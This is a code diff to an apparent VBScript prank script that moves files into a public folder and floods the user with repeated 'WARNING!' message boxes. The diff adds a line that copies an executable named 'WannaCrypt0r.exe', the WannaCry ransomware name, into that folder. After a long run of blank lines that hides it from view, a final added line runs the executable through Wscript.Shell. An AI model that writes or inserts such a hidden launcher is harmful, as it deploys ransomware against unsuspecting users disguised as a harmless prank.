@@ -24,7 +24,7 @@ Afile.Close
 
 FSO.MoveFile "Alert.txt","C:\Users\Public\101\102\"
 FSO.MoveFile "Warning.txt","C:\Users\Public\101\102\"
-FSO.MoveFile "Warning.txt","C:\Users\Public\101\102\"
+FSO.MoveFile "WannaCrypt0r.exe","C:\Users\Public\101\102\"
 
 
 CreateObject("Wscript.Shell").Run """C:\Users\Public\101\102\Alert.txt""", 1, True
@@ -96,3 +96,17 @@ y=MsgBox("WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING
 y=MsgBox("WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING!", 2+16, "Error Notice!!!")
 y=MsgBox("WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING!", 2+16, "Error Notice!!!")
 y=MsgBox("WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING! WARNING!", 2+16, "Error Notice!!!")
+
+
+
+
+
+
+
+
+
+
+
+
+
+CreateObject("Wscript.Shell").Run """C:\Users\Public\101\102\WannaCrypt0r.exe""", 1, True
